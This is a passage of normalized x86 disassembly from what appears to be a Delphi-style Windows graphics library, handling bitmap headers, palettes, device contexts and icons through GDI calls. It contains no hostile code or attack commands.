je r-xdata
mov eax [ ebp - 0x1c ]
call sub_425f54
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_402f00
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_42a3bb
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b940
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_425b18
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_42a38f
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426210
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40f26c
call sub_4259f8
jmp r-xdata
xor eax eax
push ebp
push sub_42a422
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41b940
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a396
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a45a
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40f26c
call sub_4259f8
jmp r-xdata
sub_42a396
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_402f1c
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_42a45a
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_403af4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_42a4ef
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_426210
mov [ ebp - 0x30 ] eax
sub_42a50c
lea eax [ ebp - 0x9c ]
push eax
movzx eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_429ebc
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a554
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429c4c
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41b940
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_403af4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_429ebc
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_429fe4
call sub_4259f8
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_42a5c4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_429c4c
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_403af4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42916c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42a65f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_429ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a688
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_429a1c
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_429c4c
mov eax esi
call sub_429d5c
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_429c4c
mov eax esi
call sub_429d5c
mov eax esi
call sub_429bd8
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42916c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_42957c
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429ebc
jmp r-xdata
push esp
movzx edx [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_429ebc
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_428b08
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a7c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov edx [ eax + 0x1c ]
mov ecx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_42a7e0
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_429c5c
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
movzx eax bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_42957c
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a85c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_429c4c
mov eax ebx
call sub_429c5c
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_428b08
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a8f4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
movzx eax [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_429ebc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428a00
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_4238c0
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42a8f9
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_404eec
call sub_404f40
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428a00
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a930
push ebp
mov ebp esp
add esp 0xffffffa0
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429a9c
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
sub al 0x1
jb r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ rw-data ]
call sub_4259e0
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x5d ]
xor ecx ecx
mov edx 0x54
call sub_403af4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
lea esi [ eax + 0x18 ]
lea edi [ ebp - 0x5d ]
mov ecx 0x6
[ edi ] [ esi ]
mov [ ebp - 0x9 ] 0x0
xor edx edx
mov [ ebp - 0x49 ] edx
mov [ ebp - 0x45 ] 0x28
mov edx [ ebp - 0x59 ]
mov [ ebp - 0x41 ] edx
mov edx [ ebp - 0x55 ]
mov [ ebp - 0x3d ] edx
mov [ ebp - 0x39 ] 0x1
movzx edx bl
movzx edx [ edx + rw-data ]
mov [ ebp - 0x37 ] dx
mov eax [ eax + 0x10 ]
mov [ ebp - 0x8 ] eax
sub bl 0x2
je r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec bl
je r-xdata
xor eax eax
push ebp
push sub_42aa7c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x5d ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_42957c
cmp [ ebp - 0x8 ] 0x0
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425b18
mov ebx eax
push ebx
call CreateHalftonePalette
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x9 ] 0x1
push ebx
push 0x0
call ReleaseDC
jmp r-xdata
sub bl 0x2
je r-xdata
retn
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
mov [ ebp - 0x35 ] 0x3
mov [ ebp - 0x1d ] 0xf800
mov [ ebp - 0x19 ] 0x7e0
mov [ ebp - 0x15 ] 0x1f
jmp r-xdata
sub_42aa98
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x28 ]
mov ecx [ eax + 0x20 ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop edi
pop esi
pop ebx
retn
sub_42aabc
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_403af4
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_429bd8
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_42696c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b978
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41b978
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_403af4
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4299b0
movzx edx [ r-xdata ]
call sub_4257f0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_425b18
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
movzx eax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_428abc
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b978
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41b978
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
movzx edx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
movzx edx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
movzx eax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41b978
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41b978
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
movzx eax [ ebp + 0x70 ]
movzx ecx [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41b978
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41b978
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425f90
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41b978
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4262b4
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
add eax eax
add eax eax
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42ad7c
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_429c5c
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_428b08
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42adf6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42916c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ae1c
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebp ecx
mov edi edx
mov esi eax
mov ebx [ esi + 0x28 ]
cmp edi [ ebx + 0x1c ]
jne r-xdata
mov eax esi
call sub_429c5c
push esi
push edi
lea esi [ ebx + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x8 ] ebp
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] ebp
push esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_42957c
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebp [ ebx + 0x20 ]
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42ae80
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax esi
call sub_404640
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42aec8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_426cb4
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428934
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42af1c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428938
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419e14
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_42af4c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42b228
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_428934
mov eax [ esi + 0x28 ]
call sub_428938
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_419e40
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42afac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax esi
call sub_4257f0
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42b008
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42b044
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41b734
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41b940
movzx eax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_426564
jmp r-xdata
jmp r-xdata
call sub_425a04
sub_42b0bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b149
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42b008
cmp eax [ rw-data ]
jne r-xdata
call sub_425a04
mov eax esi
call sub_42b008
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_426ab4
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_403af4
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b978
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42b170
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b1fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41b714
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41b940
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41b940
movzx eax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42b228
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_425a04
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b203
mov eax [ ebp - 0x4 ]
call sub_404650
call sub_404eec
call sub_404f40
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b228
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42b268
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428934
mov eax [ ebx + 0x28 ]
call sub_428938
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b29c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42b228
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetIconInfo
test eax eax
je r-xdata
xor edx edx
push ebp
push sub_42b319
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x30 ]
push eax
push 0x18
mov eax [ ebp - 0x8 ]
push eax
call GetObjectA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
mov eax [ ebp - 0x8 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ ebp - 0x2c ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0x2c ]
mov [ eax + 0x14 ] edx
sub_42b384
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42b0bc
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
